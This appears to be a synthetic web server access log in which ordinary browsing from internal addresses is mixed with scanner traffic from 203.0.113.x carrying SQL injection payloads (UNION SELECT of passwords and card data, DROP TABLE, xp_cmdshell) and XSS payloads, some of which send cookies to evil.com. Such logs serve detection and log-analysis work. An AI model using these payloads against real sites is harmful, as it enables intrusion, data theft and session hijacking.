192.168.1.138 - - [06/May/2026:02:57:17 +0800] "GET /api/settings HTTP/1.1" 200 29750 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.123 - - [06/May/2026:08:29:51 +0800] "GET /api/settings HTTP/1.1" 200 38831 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.122 - - [05/May/2026:23:34:50 +0800] "GET /support HTTP/1.1" 301 3681 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.144 - - [06/May/2026:10:54:21 +0800] "GET /index.html HTTP/1.1" 200 42759 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.128 - - [06/May/2026:00:40:40 +0800] "GET /events HTTP/1.1" 200 14007 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.105 - - [06/May/2026:18:06:44 +0800] "GET /faq HTTP/1.1" 200 16955 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.111 - - [06/May/2026:11:55:39 +0800] "GET /images/logo.png HTTP/1.1" 200 23744 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.121 - - [06/May/2026:04:39:45 +0800] "GET /press HTTP/1.1" 200 25892 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.104 - - [06/May/2026:06:10:00 +0800] "GET /index.html HTTP/1.1" 200 20248 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.115 - - [06/May/2026:09:47:31 +0800] "GET /services HTTP/1.1" 200 40334 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.106 - - [05/May/2026:23:41:10 +0800] "POST /careers HTTP/1.1" 200 45491 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.113 - - [06/May/2026:04:48:44 +0800] "GET /partners HTTP/1.1" 200 36693 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.100 - - [05/May/2026:19:06:25 +0800] "GET /api/products HTTP/1.1" 200 36648 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.149 - - [06/May/2026:13:47:46 +0800] "GET /css/style.css HTTP/1.1" 200 21678 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.119 - - [05/May/2026:21:31:27 +0800] "GET /careers HTTP/1.1" 200 46612 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.143 - - [06/May/2026:11:59:03 +0800] "GET /blog HTTP/1.1" 200 28340 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.137 - - [06/May/2026:12:26:55 +0800] "GET /news HTTP/1.1" 200 1840 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.106 - - [05/May/2026:21:22:00 +0800] "GET /news HTTP/1.1" 200 15893 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.136 - - [06/May/2026:15:26:05 +0800] "GET /js/app.js HTTP/1.1" 200 15153 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.119 - - [06/May/2026:08:04:06 +0800] "GET /gallery HTTP/1.1" 200 30285 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.126 - - [05/May/2026:18:59:20 +0800] "GET /api/users HTTP/1.1" 200 14157 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.132 - - [05/May/2026:20:39:25 +0800] "GET /resources HTTP/1.1" 200 10913 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.128 - - [05/May/2026:18:20:08 +0800] "GET /news HTTP/1.1" 200 24987 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.123 - - [06/May/2026:00:31:41 +0800] "GET /api/users HTTP/1.1" 304 18880 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.100 - - [06/May/2026:11:17:18 +0800] "GET /news HTTP/1.1" 200 11299 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.102 - - [05/May/2026:19:34:54 +0800] "GET /about.html HTTP/1.1" 200 38059 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.148 - - [05/May/2026:22:43:48 +0800] "GET /news HTTP/1.1" 200 23704 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.118 - - [06/May/2026:06:16:48 +0800] "GET /partners HTTP/1.1" 200 41319 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.118 - - [05/May/2026:23:32:45 +0800] "GET /resources HTTP/1.1" 200 30688 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.121 - - [06/May/2026:09:20:59 +0800] "POST /press HTTP/1.1" 200 46900 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.138 - - [05/May/2026:23:16:19 +0800] "POST /resources HTTP/1.1" 200 30265 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.117 - - [06/May/2026:13:37:54 +0800] "POST /news HTTP/1.1" 200 27609 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.102 - - [05/May/2026:18:49:47 +0800] "GET /faq HTTP/1.1" 200 27320 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.144 - - [06/May/2026:05:04:57 +0800] "GET /js/app.js HTTP/1.1" 404 20310 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.141 - - [06/May/2026:00:31:08 +0800] "GET /favicon.ico HTTP/1.1" 200 26751 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.116 - - [05/May/2026:22:50:55 +0800] "POST /careers HTTP/1.1" 200 3335 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.127 - - [05/May/2026:20:36:15 +0800] "POST /products HTTP/1.1" 200 19529 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.116 - - [06/May/2026:08:13:15 +0800] "GET /partners HTTP/1.1" 404 32440 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
203.0.113.44 - - [05/May/2026:22:34:25 +0800] "GET /items?id=1; DROP TABLE users;-- HTTP/1.1" 200 4744 "-" "Nikto/2.1.6"
203.0.113.42 - - [05/May/2026:22:45:02 +0800] "GET /products?id=1 UNION ALL SELECT NULL,NULL,NULL-- HTTP/1.1" 403 4243 "-" "Nikto/2.1.6"
192.168.1.100 - - [06/May/2026:04:54:22 +0800] "GET /images/logo.png HTTP/1.1" 200 25024 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
203.0.113.40 - - [05/May/2026:22:45:29 +0800] "GET /search?keyword=' UNION SELECT credit_card,cvv FROM payments-- HTTP/1.1" 200 1921 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.44 - - [05/May/2026:23:53:18 +0800] "GET /items?id=1; DROP TABLE users;-- HTTP/1.1" 403 4332 "-" "Nikto/2.1.6"
203.0.113.40 - - [05/May/2026:22:13:00 +0800] "GET /products?category=1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- HTTP/1.1" 500 1777 "-" "Nikto/2.1.6"
203.0.113.42 - - [05/May/2026:23:50:40 +0800] "GET /items?id=1; DROP TABLE users;-- HTTP/1.1" 200 3255 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.42 - - [05/May/2026:23:22:35 +0800] "GET /search?q=' UNION SELECT username,password FROM users-- HTTP/1.1" 500 1030 "-" "Nikto/2.1.6"
192.168.1.123 - - [06/May/2026:03:58:57 +0800] "GET /about.html HTTP/1.1" 200 1640 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.113 - - [06/May/2026:09:54:13 +0800] "GET /css/style.css HTTP/1.1" 200 43360 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
203.0.113.43 - - [05/May/2026:23:05:44 +0800] "GET /api/query?sql=SELECT * FROM users WHERE id=1 OR 1=1 HTTP/1.1" 200 444 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.41 - - [05/May/2026:22:31:09 +0800] "GET /products?category=1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- HTTP/1.1" 403 3366 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
192.168.1.130 - - [05/May/2026:23:40:15 +0800] "GET /index.html HTTP/1.1" 200 39135 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.117 - - [06/May/2026:15:45:16 +0800] "GET /careers HTTP/1.1" 200 24723 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
203.0.113.40 - - [05/May/2026:23:14:32 +0800] "GET /search?keyword=' UNION SELECT credit_card,cvv FROM payments-- HTTP/1.1" 500 4513 "-" "Nikto/2.1.6"
203.0.113.42 - - [05/May/2026:22:53:06 +0800] "GET /login?user=admin'-- HTTP/1.1" 403 2405 "-" "Nikto/2.1.6"
192.168.1.117 - - [05/May/2026:18:32:12 +0800] "GET /docs/api HTTP/1.1" 200 7641 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.100 - - [06/May/2026:13:10:10 +0800] "GET /favicon.ico HTTP/1.1" 200 22880 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.104 - - [05/May/2026:18:51:13 +0800] "GET /gallery HTTP/1.1" 200 5526 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
192.168.1.143 - - [06/May/2026:09:36:29 +0800] "POST /news HTTP/1.1" 200 48485 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
203.0.113.40 - - [05/May/2026:23:04:39 +0800] "GET /products?id=1 UNION ALL SELECT NULL,NULL,NULL-- HTTP/1.1" 200 1317 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
192.168.1.113 - - [06/May/2026:03:02:49 +0800] "GET /downloads HTTP/1.1" 200 48063 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
203.0.113.42 - - [06/May/2026:00:03:16 +0800] "GET /login?user=admin'-- HTTP/1.1" 500 4309 "-" "Nikto/2.1.6"
203.0.113.40 - - [06/May/2026:00:06:06 +0800] "GET /api/users?id=1 OR 1=1-- HTTP/1.1" 200 1851 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.42 - - [05/May/2026:22:12:31 +0800] "GET /users?sort=name; EXEC xp_cmdshell('dir')-- HTTP/1.1" 500 2247 "-" "Nikto/2.1.6"
203.0.113.41 - - [06/May/2026:00:03:07 +0800] "GET /search?q=' UNION SELECT username,password FROM users-- HTTP/1.1" 200 4849 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.44 - - [05/May/2026:23:03:05 +0800] "GET /api/items?category=electronics'; WAITFOR DELAY '0:0:5'-- HTTP/1.1" 200 4756 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.44 - - [05/May/2026:23:22:14 +0800] "GET /search?q='; INSERT INTO admin VALUES('hacker','pass')-- HTTP/1.1" 500 3161 "-" "Nikto/2.1.6"
192.168.1.104 - - [06/May/2026:05:33:12 +0800] "POST /terms HTTP/1.1" 200 37946 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
203.0.113.41 - - [05/May/2026:23:03:43 +0800] "GET /login?user=admin'-- HTTP/1.1" 500 3729 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.41 - - [05/May/2026:23:15:58 +0800] "GET /api/query?sql=SELECT * FROM users WHERE id=1 OR 1=1 HTTP/1.1" 500 1878 "-" "Nikto/2.1.6"
203.0.113.44 - - [05/May/2026:23:14:43 +0800] "GET /api/items?category=electronics'; WAITFOR DELAY '0:0:5'-- HTTP/1.1" 403 2827 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
192.168.1.110 - - [06/May/2026:12:18:10 +0800] "GET /docs/api HTTP/1.1" 200 21287 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
203.0.113.43 - - [05/May/2026:23:05:04 +0800] "GET /api/users?id=1 OR 1=1-- HTTP/1.1" 500 2723 "-" "Nikto/2.1.6"
192.168.1.148 - - [06/May/2026:03:47:48 +0800] "GET /faq HTTP/1.1" 200 43140 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
203.0.113.42 - - [05/May/2026:23:37:29 +0800] "GET /search?keyword=' UNION SELECT credit_card,cvv FROM payments-- HTTP/1.1" 200 4076 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.43 - - [05/May/2026:23:07:35 +0800] "GET /products?category=1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- HTTP/1.1" 500 3919 "-" "Nikto/2.1.6"
192.168.1.142 - - [05/May/2026:23:08:53 +0800] "GET /products HTTP/1.1" 200 9020 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
192.168.1.120 - - [06/May/2026:04:35:21 +0800] "GET /events HTTP/1.1" 200 2982 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
203.0.113.43 - - [05/May/2026:22:52:05 +0800] "GET /api/items?category=electronics'; WAITFOR DELAY '0:0:5'-- HTTP/1.1" 403 1735 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.42 - - [05/May/2026:23:02:30 +0800] "GET /api/items?category=electronics'; WAITFOR DELAY '0:0:5'-- HTTP/1.1" 200 2780 "-" "Nikto/2.1.6"
192.168.1.125 - - [05/May/2026:19:36:46 +0800] "GET /css/style.css HTTP/1.1" 200 20085 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
203.0.113.42 - - [06/May/2026:00:06:47 +0800] "GET /products?category=1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- HTTP/1.1" 200 486 "-" "Nikto/2.1.6"
192.168.1.137 - - [06/May/2026:12:41:38 +0800] "GET /js/app.js HTTP/1.1" 200 27357 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
203.0.113.43 - - [05/May/2026:23:02:16 +0800] "GET /api/items?category=electronics'; WAITFOR DELAY '0:0:5'-- HTTP/1.1" 403 2876 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
192.168.1.126 - - [06/May/2026:06:11:01 +0800] "GET /about.html HTTP/1.1" 200 10817 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
203.0.113.41 - - [05/May/2026:23:55:13 +0800] "GET /users?sort=name; EXEC xp_cmdshell('dir')-- HTTP/1.1" 403 4009 "-" "Nikto/2.1.6"
203.0.113.42 - - [05/May/2026:23:51:16 +0800] "GET /login?user=admin'-- HTTP/1.1" 200 2276 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.41 - - [05/May/2026:22:13:44 +0800] "GET /search?q=' UNION SELECT username,password FROM users-- HTTP/1.1" 500 1521 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.44 - - [05/May/2026:22:10:40 +0800] "GET /api/login?username=admin'/*&password=*/OR/*1=1-- HTTP/1.1" 403 1371 "-" "Nikto/2.1.6"
192.168.1.142 - - [06/May/2026:00:50:22 +0800] "GET /events HTTP/1.1" 200 7752 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15"
203.0.113.44 - - [05/May/2026:22:48:00 +0800] "GET /search?q='; INSERT INTO admin VALUES('hacker','pass')-- HTTP/1.1" 200 307 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.42 - - [05/May/2026:23:03:15 +0800] "GET /products?category=1 AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- HTTP/1.1" 403 2760 "-" "Nikto/2.1.6"
203.0.113.44 - - [05/May/2026:23:08:43 +0800] "GET /api/login?username=admin'/*&password=*/OR/*1=1-- HTTP/1.1" 200 3871 "-" "Nikto/2.1.6"
203.0.113.40 - - [05/May/2026:23:49:42 +0800] "GET /api/login?username=admin'/*&password=*/OR/*1=1-- HTTP/1.1" 403 3403 "-" "Nikto/2.1.6"
203.0.113.44 - - [05/May/2026:22:15:42 +0800] "GET /login?user=admin'-- HTTP/1.1" 403 3173 "-" "Nikto/2.1.6"
203.0.113.43 - - [05/May/2026:22:43:10 +0800] "GET /search?keyword=' UNION SELECT credit_card,cvv FROM payments-- HTTP/1.1" 500 899 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.42 - - [05/May/2026:23:08:35 +0800] "GET /search?q='; INSERT INTO admin VALUES('hacker','pass')-- HTTP/1.1" 500 838 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.40 - - [05/May/2026:22:49:38 +0800] "GET /search?q='; INSERT INTO admin VALUES('hacker','pass')-- HTTP/1.1" 200 1656 "-" "Nikto/2.1.6"
203.0.113.42 - - [05/May/2026:22:58:31 +0800] "GET /search?q=' UNION SELECT username,password FROM users-- HTTP/1.1" 500 3227 "-" "Nikto/2.1.6"
203.0.113.44 - - [05/May/2026:22:24:46 +0800] "GET /items?id=1; DROP TABLE users;-- HTTP/1.1" 200 4897 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.40 - - [05/May/2026:23:50:09 +0800] "GET /products?id=1 UNION ALL SELECT NULL,NULL,NULL-- HTTP/1.1" 200 3249 "-" "Nikto/2.1.6"
203.0.113.42 - - [05/May/2026:23:02:04 +0800] "GET /users?sort=name; EXEC xp_cmdshell('dir')-- HTTP/1.1" 500 3921 "-" "Nikto/2.1.6"
203.0.113.41 - - [05/May/2026:22:39:37 +0800] "GET /search?q=' UNION SELECT username,password FROM users-- HTTP/1.1" 200 1512 "-" "Nikto/2.1.6"
203.0.113.43 - - [05/May/2026:22:20:12 +0800] "GET /api/data?filter=' OR '1'='1 HTTP/1.1" 500 452 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.43 - - [05/May/2026:23:58:54 +0800] "GET /search?q='; INSERT INTO admin VALUES('hacker','pass')-- HTTP/1.1" 500 678 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
192.168.1.123 - - [05/May/2026:22:47:50 +0800] "GET /api/users HTTP/1.1" 200 42272 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
192.168.1.123 - - [06/May/2026:17:13:45 +0800] "GET /blog HTTP/1.1" 200 3852 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
192.168.1.131 - - [06/May/2026:14:48:41 +0800] "GET /support HTTP/1.1" 200 1682 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0"
203.0.113.43 - - [06/May/2026:00:00:04 +0800] "GET /api/login?username=admin'/*&password=*/OR/*1=1-- HTTP/1.1" 500 4195 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.41 - - [05/May/2026:22:27:08 +0800] "GET /items?id=1; DROP TABLE users;-- HTTP/1.1" 200 3521 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.43 - - [05/May/2026:23:52:25 +0800] "GET /api/items?category=electronics'; WAITFOR DELAY '0:0:5'-- HTTP/1.1" 403 4060 "-" "Nikto/2.1.6"
203.0.113.48 - - [06/May/2026:01:34:56 +0800] "GET /search?q="><script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1" 200 2036 "-" "curl/7.88.1"
203.0.113.47 - - [06/May/2026:00:54:46 +0800] "GET /search?q=<input onfocus=alert('XSS') autofocus> HTTP/1.1" 403 1393 "-" "Wget/1.21.3"
203.0.113.46 - - [06/May/2026:01:35:54 +0800] "GET /comment?body=<marquee onstart=alert('XSS')> HTTP/1.1" 403 1679 "-" "Wget/1.21.3"
192.168.1.128 - - [06/May/2026:05:06:02 +0800] "GET /help HTTP/1.1" 200 38386 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
203.0.113.45 - - [06/May/2026:01:05:27 +0800] "GET /api/message?text=<script>fetch('http://evil.com/log?c='+document.cookie)</script> HTTP/1.1" 400 769 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.45 - - [06/May/2026:01:31:12 +0800] "GET /search?q=<input onfocus=alert('XSS') autofocus> HTTP/1.1" 200 2496 "-" "python-requests/2.31.0"
203.0.113.48 - - [06/May/2026:00:24:32 +0800] "GET /profile?name=<svg onload=alert('XSS')> HTTP/1.1" 400 2496 "-" "Nikto/2.1.6"
203.0.113.45 - - [06/May/2026:00:44:27 +0800] "GET /api/comment?content=<iframe src='javascript:alert(1)'> HTTP/1.1" 200 855 "-" "python-requests/2.31.0"
203.0.113.46 - - [06/May/2026:00:26:56 +0800] "GET /search?q=<input onfocus=alert('XSS') autofocus> HTTP/1.1" 400 1038 "-" "curl/7.88.1"
203.0.113.49 - - [06/May/2026:00:46:33 +0800] "GET /comment?body=<marquee onstart=alert('XSS')> HTTP/1.1" 400 426 "-" "Nikto/2.1.6"
203.0.113.49 - - [06/May/2026:00:39:03 +0800] "GET /search?q=<input onfocus=alert('XSS') autofocus> HTTP/1.1" 403 2246 "-" "Wget/1.21.3"
203.0.113.46 - - [06/May/2026:00:18:07 +0800] "GET /profile?bio=<div onclick=alert('XSS')>Click me</div> HTTP/1.1" 200 1827 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.47 - - [06/May/2026:00:54:14 +0800] "GET /api/comment?content=<iframe src='javascript:alert(1)'> HTTP/1.1" 400 1220 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.47 - - [06/May/2026:00:27:57 +0800] "GET /profile?bio=<div onclick=alert('XSS')>Click me</div> HTTP/1.1" 200 1641 "-" "Nikto/2.1.6"
203.0.113.47 - - [06/May/2026:01:13:47 +0800] "GET /profile?bio=<div onclick=alert('XSS')>Click me</div> HTTP/1.1" 403 1268 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.47 - - [06/May/2026:01:34:41 +0800] "GET /profile?name=<svg onload=alert('XSS')> HTTP/1.1" 403 1870 "-" "curl/7.88.1"
203.0.113.49 - - [06/May/2026:00:46:54 +0800] "GET /comment?body=<marquee onstart=alert('XSS')> HTTP/1.1" 200 571 "-" "Wget/1.21.3"
203.0.113.47 - - [06/May/2026:00:28:10 +0800] "GET /comment?text=<script>alert('XSS')</script> HTTP/1.1" 400 1422 "-" "curl/7.88.1"
203.0.113.48 - - [06/May/2026:00:38:39 +0800] "GET /comment?body=<marquee onstart=alert('XSS')> HTTP/1.1" 200 2202 "-" "Wget/1.21.3"
203.0.113.49 - - [06/May/2026:01:21:57 +0800] "GET /comment?text=<script>alert('XSS')</script> HTTP/1.1" 400 1345 "-" "curl/7.88.1"
203.0.113.48 - - [06/May/2026:00:22:21 +0800] "GET /search?q=<input onfocus=alert('XSS') autofocus> HTTP/1.1" 200 874 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.48 - - [06/May/2026:01:34:02 +0800] "GET /profile?bio=<div onclick=alert('XSS')>Click me</div> HTTP/1.1" 403 1885 "-" "Nikto/2.1.6"
203.0.113.48 - - [06/May/2026:00:54:18 +0800] "GET /profile?name=<svg onload=alert('XSS')> HTTP/1.1" 400 2480 "-" "Nikto/2.1.6"
203.0.113.46 - - [06/May/2026:00:18:32 +0800] "GET /api/message?text=<script>fetch('http://evil.com/log?c='+document.cookie)</script> HTTP/1.1" 200 2001 "-" "DirBuster-1.0-RC1 (http://www.owasp.org/)"
203.0.113.47 - - [06/May/2026:00:12:01 +0800] "GET /api/message?text=<script>fetch('http://evil.com/log?c='+document.cookie)</script> HTTP/1.1" 403 2946 "-" "sqlmap/1.7.2#stable (https://sqlmap.org)"
203.0.113.46 - - [06/May/2026:01:33:53 +0800] "GET /api/message?text=<script>fetch('http://evil.com/log?c='+document.cookie)</script> HTTP/1.1" 400 2999 "-" "Nikto/2.1.6"
203.0.113.45 - - [06/May/2026:01:05:45 +0800] "GET /search?q="><script>document.location='http://evil.com/steal?c='+document.cookie</script> HTTP/1.1" 200 2453 "-" "python-requests/2.31.0"
203.0.113.49 - - [06/May/2026:00:27:53 +0800] "GET /api/comment?content=<iframe src='javascript:alert(1)'> HTTP/1.1" 400 1593 "-" "Wget/1.21.3"
203.0.113.49 - - [06/May/2026:00:21:37 +0800] "GET /api/comment?content=<iframe src='javascript:alert(1)'> HTTP/1.1" 400 2277 "-" "python-requests/2.31.0"
